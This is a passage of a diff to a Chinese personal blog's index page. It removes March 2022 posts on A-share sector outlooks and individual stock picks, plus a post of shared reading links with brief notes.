-<p>网络安全板块2021年收入取得快速增长，但是由于2021年网安公司员工数量快速扩张，成本端压力上升明显，导致利润端短期承压，扣非净利润普遍下滑。我们认为随着低基数效应的消失，以及前置投入压力的边际下降，2022年相关上市公司利润率有较大的可能性实现恢复。预计22Q1网络安全板块收入端能够实现较快增长，但短期利润端仍有一定压力。</p>
-<p>5）医疗IT</p>
-<p>疫情下收入实现较快增长，多数公司利润同步增长。</p>
-<p>由于2020年疫情爆发以来，下游客户的主要精力集中在抗疫方面，IT投入的招标和确认受到一些影响，医疗IT公司在拿单端普遍承压。展望2022年，如果抗疫取得阶段性成果，客户重心会重新向IT投入倾斜，带来中期加速增长的机会。预计22Q1收入端能够实现平稳增长，利润端同步增长。</p>
-<p>6）基础软件</p>
-<p>政策驱动下2022年国产替代进程有望加快。</p>
-<p>2021年基础软件板块归母净利润下滑主要受板块内企业研发投入加大、实施股权激励等因素影响。展望2022年，在国家产业政策驱动下，基础软件领域的国产替代进程有望加快，预计22Q1板块收入将加速增长。</p>
-<p>7）金融科技</p>
-<p>行业有望继续维持景气向上态势。</p>
-<p>1）资管&#x2F;券商IT：展望2022年，我们认为资本市场改革将继续深化，财富管理行业仍将保持快速发展，资管&#x2F;券商IT行业仍将维持景气态势。2）银行IT：展望2022年，我们认为，银行IT行业仍将维持景气态势：一是2022年金融信创试点范围将进一步扩大；二是银行数字化转型有望加速推进。</p>
-<p>8）人工智能</p>
-<p>如何盈利仍然是多数AI企业面临的首要问题</p>
-<p>人工智能板块目前只有海康威视、虹软科技等少数公司具备盈利能力，多数公司尚处亏损。展望2022年，我们认为随着算法进步、企业智能化转型、AI应用规模化落地、细分领域渗透率提升，AI板块收入或将迎来高增长。</p>
-<p>根据已披露的 AI 企业财务数据来看，目前主要有 AI+安防&amp;政企领域的海康威视(002415CH)、智能手机&amp;智能驾驶领域的虹软科技(688088 CH)具备盈利能力，其余公司大多仍处于亏损状态，陷入“融资-研发-营销-亏损-再融资”的循环是行业普遍面临的窘境。</p>
-<p>相关个股</p>
-<ul>
-<li>智能汽车：四维图新，千方科技，东软集团</li>
-<li>工业软件：中控技术，柏楚电子，宝信软件</li>
-<li>云计算：浪潮信息，中科曙光，深信服，广联达</li>
-<li>网络安全：绿盟科技，启明星辰，安恒信息</li>
-<li>医疗IT：卫宁健康，创业慧康，久远银海</li>
-<li>证券，银行IT：恒生电子，东方财富，同花顺，长亮科技</li>
-</ul>
-<h2 id="个股"><a href="#个股" class="headerlink" title="个股"></a>个股</h2><h3 id="国邦医药（新冠原料药），价格不高"><a href="#国邦医药（新冠原料药），价格不高" class="headerlink" title="国邦医药（新冠原料药），价格不高"></a>国邦医药（新冠原料药），价格不高</h3><p>无论是辉瑞、盐野义还是国内仿制的广生堂，其特效药都是由3CL蛋白酶抑制剂组成，SM1（环谷氨酰胺类似物）是合成多个3CL新冠口服药物分子的关键中间体，按照每1亿疗程原料需求量300吨计算SM1的质量比约1：1，侧SM1需求量为300吨。硼氢化钠是SM1合成还原的优先试剂，国内一直以国邦为主导的供应格局，国内的江苏宏梓、宁夏百斯特两个同行生产线规模都较小。公司目前液体硼氢化钠产能为60000吨，固体硼氢化钠产能为4000吨，能满足市场的充分供应。</p>
-<h3 id="神工股份"><a href="#神工股份" class="headerlink" title="神工股份"></a>神工股份</h3><p>这家半导体级单晶硅材料龙头订单需求大幅增加，国内8英寸硅片产品供货持续紧张，公司募投项目产品已进入第二阶段送样；神工股份2月期间接待多家机构电话调研，2021年公司实现营业总收入47,401.19万元，同比增长146.76%；实现归属于母公司所有者的净利润22,023.49万元，同比增长119.63%；实现归属于母公司所有者的扣除非经常性损益的净利润21,600.44万元，同比增长140.96%。</p>
-<p>公司是具备“从晶体生长到硅电极完成品制造”完整能力的一体化厂商，拥有全球领先的大直径单晶硅材料晶体制造技术，是海外刻蚀机原厂硅电极产品的上游材料供应商。2021年全球集成电路产业蓬勃发展，景气度持续提升，市场需求旺盛。受此影响，公司刻蚀机用大直径单晶硅材料订单需求大幅增加。</p>
-<p>此外，公司8英寸轻掺低缺陷硅片产品对标日本信越公司生产的S2硅片。目前国内8英寸轻掺低缺陷硅片主要依赖海外进口，随着本土化需求增长，公司将迎来更多发展机遇。据悉，海外主流硅片厂商新增产能主要集中12英寸产品，8英寸产品产能保持不变甚至减少。国内主流集成电路制造厂商持续扩产8英寸制程，使得8英寸轻掺低缺陷硅片产品供货持续紧张。公司目前已经取得国内某集成电路制造厂商的积极反馈，进入第二阶段送样；同时取得国内主流IC大厂的入场券，完成了实质性的规格、技术探讨，正在准备送样阶段。</p>
-<p>浙商证券分析师认为，公司作为国内半导体级单晶硅材料龙头，行业景气度滞后于晶圆代工厂投产进度，因此景气周期仍在前期阶段，硅材料&#x2F;硅电极业务成长确定性较强，未来随着景气度的持续改善，有业绩持续超预期的可能性。</p>
-<p>A股相关上市公司中，宏微科技拥有研发设计市场主流IGBT和FRED芯片的能力，产品涵盖IGBT、FRED、MOSFET芯片及单管产品100余种，IGBT、FRED、MOSFET、整流二极管及晶闸管等模块产品400余种。江丰电子超高纯金属溅射靶材产品已应用于世界著名半导体厂商的先端制造工艺，在7纳米技术节点实现批量供货，应用于5纳米技术节点的部分产品评价通过并量产。</p>
- 
-      <!-- reward -->
-      
-    </div>
-    
-
-    <!-- copyright -->
-    
-    <footer class="article-footer">
-       
-    </footer>
-  </div>
-
-    
- 
-    
-</article>
-
-    
-    <article
-  id="post-分享-20220315"
-  class="article article-type-post"
-  itemscope
-  itemprop="blogPost"
-  data-scroll-reveal
->
-  <div class="article-inner">
-    
-    <header class="article-header">
-       
-<h2 itemprop="name">
-  <a class="article-title" href="/2022/03/15/%E5%88%86%E4%BA%AB-20220315/"
-    >分享-20220315</a> 
-</h2>
- 
-
-      
-    </header>
-     
-    <div class="article-meta">
-      <a href="/2022/03/15/%E5%88%86%E4%BA%AB-20220315/" class="article-date">
-  <time datetime="2022-03-15T13:31:29.000Z" itemprop="datePublished">2022-03-15</time>
-</a> 
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/%E5%88%86%E4%BA%AB-%E8%B5%84%E6%BA%90%E6%90%9C%E9%9B%86/">分享 - 资源搜集</a>
-  </div>
-   
-    </div>
-      
-    <div class="article-entry" itemprop="articleBody">
-       
-  <ul>
-<li><p>20210901 三线城市也能做 SaaS 公司<br><a target="_blank" rel="noopener" href="https://61.life/2021/901">https://61.life/2021/901</a></p>
-<blockquote>
-<p>内容没啥实质内容，但是这个现象说明一个值得思考的问题。</p>
-</blockquote>
-</li>
-<li><p>关于教育行业变化的思考 - 写在创业 9 周年<br><a target="_blank" rel="noopener" href="https://blog.devtang.com/2021/08/30/thinking-of-education-industry-change/">https://blog.devtang.com/2021/08/30/thinking-of-education-industry-change/</a></p>
-</li>
-<li><p>当你通过叙事，而预测到未来<br><a target="_blank" rel="noopener" href="http://gtdstudy.com/post/narrativeeconomics/">http://gtdstudy.com/post/narrativeeconomics/</a></p>
-<blockquote>
-<p>原来meme就是叙事经济</p>
-</blockquote>
-</li>
-<li><p>诡辩术-修辞的操纵，逻辑的谬误<br><a target="_blank" rel="noopener" href="https://www.netdoge.com/archives/13.html">https://www.netdoge.com/archives/13.html</a></p>
-<blockquote>
-<p>有点意思</p>
-</blockquote>
-</li>
-<li><p>分压器是什么，详解分压器电路基本原理<br><a target="_blank" rel="noopener" href="https://www.labno3.com/2021/08/18/basic-guide-to-voltage-dividers/">https://www.labno3.com/2021/08/18/basic-guide-to-voltage-dividers/</a></p>
-<blockquote>
-<p>我看明白了分压器的原理和电路，但是没有太懂得里边举的例子</p>
-</blockquote>
-</li>
-<li><p>Google 搜索新手指南<br><a target="_blank" rel="noopener" href="https://seo.g2soft.net/">https://seo.g2soft.net/</a></p>
-<blockquote>
-<p>如果你是一个非常非常新的用户，一直都是作为 Google 搜索的用户来使用 Google 的，现在第一次作为站长，或者企业网站的负责人来考虑网站优化和网站推广，以及 SEO，SEM 等等，那么下面这些就是写给你看的了。</p>
-</blockquote>
-</li>
-</ul>
-<p>新手和专家的区别以及如何看待学习<br><a target="_blank" rel="noopener" href="https://kaopubear.top/blog/2021-08-12-pragmatic-thinking-and-learning/">https://kaopubear.top/blog/2021-08-12-pragmatic-thinking-and-learning/</a></p>
-<blockquote>
-<p>事实上我们没有任何“空闲”时间。时间不仅像海绵里的水，它更像是硬盘空间，总是会很快被填满。<strong>为一件事情创造时间的说法用词不当，因为时间是无法创造和销毁，时间只能分配。</strong>主动安排你的学习，分配合适的时间，合理地使用时间。</p>
-</blockquote>
-<p>卡片学习法<br><a target="_blank" rel="noopener" href="https://yuukoamamiya.github.io/p/zettelkasten/">https://yuukoamamiya.github.io/p/zettelkasten/</a></p>
-<blockquote>
-<p>卡片笔记分成三个步奏：<br>先做临时笔记。这个就是inbox，随便想到什么学到什么都能往里丢，比如说看书的时候划的重点就属于这一类。<br>做文献笔记。先理解你想要摘抄的话的内容，在理解之后自己概括自己复述。<br>做永久笔记。这里其实原文挺语焉不详的，我的理解是思考怎么把前两步做的笔记和已有的笔记用超链接给连接起来。</p>
-</blockquote>
- 
-      <!-- reward -->
-      
-    </div>
-    
-
-    <!-- copyright -->
-    
-    <footer class="article-footer">
-       
-    </footer>
-  </div>
-
-    
- 
-    
-</article>
-
-    
-    <article
-  id="post-股票-20220314"
-  class="article article-type-post"
-  itemscope
-  itemprop="blogPost"
-  data-scroll-reveal
->
-  <div class="article-inner">
-    
-    <header class="article-header">
-       
-<h2 itemprop="name">
-  <a class="article-title" href="/2022/03/14/%E8%82%A1%E7%A5%A8-20220314/"
-    >每日股票-20220314</a> 
-</h2>
- 
-
-      
-    </header>
-     
-    <div class="article-meta">
-      <a href="/2022/03/14/%E8%82%A1%E7%A5%A8-20220314/" class="article-date">
-  <time datetime="2022-03-14T00:40:04.000Z" itemprop="datePublished">2022-03-14</time>
-</a> 
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/%E6%8A%95%E8%B5%84-%E8%82%A1%E7%A5%A8/">投资 - 股票</a>
-  </div>
-   
-    </div>
-      
-    <div class="article-entry" itemprop="articleBody">
-       
-  <h2 id="个股"><a href="#个股" class="headerlink" title="个股"></a>个股</h2><h3 id="亨通光电（600487）"><a href="#亨通光电（600487）" class="headerlink" title="亨通光电（600487）"></a>亨通光电（600487）</h3><p>“东数西算+智能电网+海上风电+海洋通信”，公司信息能源产品覆盖100多个国家、订单有望于今年开始释放，分析师测算目前估值仅10倍出头。<br>①国泰君安王彦龙看好公司受益“东数西算”拉动新一轮信息建设，2022年光缆市场规模有望同比增长40%以上，中国移动2021-2022年集采光缆均价同比上涨51.6%，公司占中国移动集采份额高达27%，有望更好享受价格上涨带来的红利；<br>②从海上风电建设节奏看，海缆订单有望在2022年下半年开始逐渐进行陆续释放，公司是国内少有能完整具备500kV海缆技术能力的厂商之一，并拥有多艘海上风机安装和海缆敷设船只，有望成为海洋工程利器；<br>③公司收购华为海洋后，成为跨洋通信网络解决方案的全产业链公司，海底光缆系统是全球互联互通重要载体，目前有将近40%的系统或海缆即将进行退网或者替换，有望迎来新的建设周期；<br>④王彦龙预计2021-2023年公司归母净利润预测为15.33&#x2F;24.01&#x2F;28.88亿元，同比增长44%&#x2F;57%&#x2F;20%，对应PE为21.40&#x2F;13.67&#x2F;11.36倍，给予公司2022年19倍PE估值，对应股价19元（11日收盘价13.89元）；⑤风险提示：海电缆竞争加剧、原材料成本波动。</p>
-<h3 id="国联水产-预制菜"><a href="#国联水产-预制菜" class="headerlink" title="国联水产(预制菜)"></a>国联水产(预制菜)</h3><p>这家海洋食品企业集全球采购、精深加工、食品研发于一体，预制菜品业务已形成规模，与永辉超市、盒马鲜生、山姆会员店等建立长期合作关系；<br>国联水产于3月3日接待机构调研时表示，公司致力于成为全球最具影响力的海洋食品企业，是国内少数具备全球采购、精深加工、食品研发于一体的海洋食品企业，近年来产品结构逐步从初加工水产品为主向以预制菜品、水产品精深加工为主的餐饮食材和海洋食品转型，深度布局预制菜品市场。</p>
-<p>公司预制菜品的发展已具备一定规模，公司预制菜品主要包括水煮、裹粉、米面、调理、火锅烧烤等系列。公司与全球知名西式快餐连锁企业、半天妖餐饮、永辉超市、大张超市、盒马鲜生、山姆会员店、叮叮懒人菜等建立了长期合作关系。</p>
-<p>公司构建了以“龙霸”、“小霸龙”等系列品牌的产品体系，是行业内较早进入预制菜品产业领域的生产企业之一。公司持续通过C端进行公司品牌塑造，形成线上种草，线下拔草、商超联动的综合营销格局。</p>
-<h3 id="贵州三力-中药"><a href="#贵州三力-中药" class="headerlink" title="贵州三力(中药)"></a>贵州三力(中药)</h3><p>这家贵州本地中药小龙头参与德昌祥重整快速落地，省内唯一百年老字号药企将纳入上市公司体系，产品线快速扩张；贵州三力于3月10日接待本月第二次机构调研，公司开喉剑喷雾剂在2016年以后开始布局全终端销售。截止2021年，开喉剑（儿童型）销售占比约为75%左右，开喉剑约为20%左右，其中医院端占比约为60%，其余为二、三终端。开喉剑（儿童型）目前医院端覆盖率较高，二、三终端还有较大的空间可以挖掘；而开喉剑由于是19年才纳入医保，在各终端均有较大的开发空间。</p>
-<p>2022年2月6日公司发布公告，拟成为德昌祥的破产重整投资人，一次性出资2.32亿元取得德昌祥95%股权。德昌祥是贵州省内唯一一家百年老字号药企，是家喻户晓的贵州老字号、中国驰名商标，其深厚的历史、文化底蕴，将为上市公司带来显著的品牌效应。</p>
-<p>华安证券分析师认为，德昌祥前身为贵阳中药厂，具有众多优质药品批文。德昌祥目前共有药品批准文号69个，其中独家品种9个，医保品种41个，其“龙凤至宝丹传统中药制作技艺”妇科再造丸和杜仲补天素丸更是省级非物质文化遗产。</p>
-<p>贵州三力的核心品种为开喉剑喷雾剂系列，产品结构相对集中。而德昌祥的产品线丰富，涵盖妇科、男科、儿科、呼吸科等多个科室，并有大量OTC品种，有力的补充了贵州三力的产品线。同时贵州三力经过多年发展积累的全国数千家商业公司、数千家等级医院、数万家药店、诊所及基层医疗机构资源，可以快速提升德昌祥的市场占有率。</p>
-<h2 id="新冠检测"><a href="#新冠检测" class="headerlink" title="新冠检测"></a>新冠检测</h2><p>3月12日，国家药监局网站发布的医疗器械批准证明文件(变更)待领取信息显示，由万孚生物、华大基因子公司深圳华大因源医药科技有限公司、北京金沃夫生物工程科技有限公司、南京诺唯赞医疗科技有限公司4家公司研发的4款新冠抗原检测试剂盒通过了药监局的注册信息变更。加上3月11日，国家药监局公布的北京华科泰生物的新冠抗原产品自测应用申请变更。自此，五款新冠抗原自测产品正式上市。<br>相关公司：万孚生物、华大基因，东方生物，九安医疗</p>
-<h2 id="题材"><a href="#题材" class="headerlink" title="题材"></a>题材</h2><p>装备制造（凯美特气、华测检测、乐惠国际）<br>①“增强制造业核心竞争力”首次写入政府工作报告，并提出着力培育“专精特新”企业，与去年“保持制造业比重基本稳定”的定位相比方向更加明晰；<br>②浙商证券邱世梁认为专精特新是国家战略，其中机械设备企业是主力军，并且机械板块专精特新上市公司市值普遍较小，盈利能力优异；<br>③机械行业涉及的专精特新重点领域众多，邱世梁根据子行业的市场空间、行业增速及所在公司整体的商业模式情况，精选出工业机器人、核心零部件、工业气体、检测检验、消费升级等五大核心赛道，以及潜在优质专精特新“小巨人”企业；<br>④风险因素：基建地产投资不及预期、海内外新冠疫情超预期风险。</p>
-<p>专精特新作为国家战略，聚焦高端制造，机械设备企业是主力军2021年7月30日的中央政治局会议首次将“发展专精特新中小企业”提升到国家战略高度，北交所的设立更进一步为专精特新中小企业迎来了资本支持新平台。根据邱世梁的统计，机械行业共有专精特新上市企业共计91家，占比高达26%，上市公司数量在各板块中排名第一，并且机械板块专精特新上市公司市值普遍较小，盈利能力优异。<br>精选机械行业“专精特新”领域五大核心赛道邱世梁根据子行业的市场空间、行业增速及所在公司整体的商业模式情况，精选出五大核心赛道。（1）工业机器人：预计到2025年中国工业机器人市场累计增量市场空间有望超1000亿元。<br>（2）核心零部件：零部件企业具有需求广阔、业务可靠性好、商业模式复制性强等特征，看好齿轮、减速器及FA零部件等领域。<br>（3）工业气体：中国工业气体近2000亿元市场，其中特种气体市场自主品牌占有率仅10%，潜力巨大。<br>（4）检测检验：检测行业空间大，需求来源广泛、稳定性强，受宏观经济影响较小，行业龙头有望通过“内生外延”的方式实现全国扩张，市占率持续提升。 <br>（5）消费升级：近年来国内及欧美消费升级趋势带动了新兴产业的大发展，企业通过产品升级和转型运营两大路径，可以打开数倍于原市场的成长空间。</p>
-<p>精选装备制造业“专精特新”潜在优秀标的目前，已有大批高端制造代表公司已成为了专精特新小巨人企业中的“排头兵”，其大多具有以下特点。（1）劳动力成本优势+工程师红利，国产替代加速进行。<br>（2）深耕细分赛道+专注核心产品，市场份额及龙头地位不断提升。</p>
-<p>邱世梁基于已入选名单中机械行业上市公司特点和专精特新“小巨人”培育条件两大方面，精选出机械板块潜在优质专精特新“小巨人”企业。<br>重点公司包括：宏华数科、凯美特气、乐惠国际、双环传动、中兵红箭、华测检测、春风动力、绿地谐波、华锐精密、欧科亿、弘亚数控、巨星科技、国茂股份、青鸟消防、东睦股份等。</p>
- 
-      <!-- reward -->
-      
-    </div>
-    
-
-    <!-- copyright -->
-    
-    <footer class="article-footer">
-       
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%8A%95%E8%B5%84/" rel="tag">投资</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E8%82%A1%E7%A5%A8/" rel="tag">股票</a></li></ul>
-
-    </footer>
-  </div>
-
-    
- 
-    
-</article>
-
-    
   </article>
   
 
   
   <nav class="page-nav">
     
-    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/2/">下一页</a>
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/2/">下一页</a>
   </nav>
   
 </section>
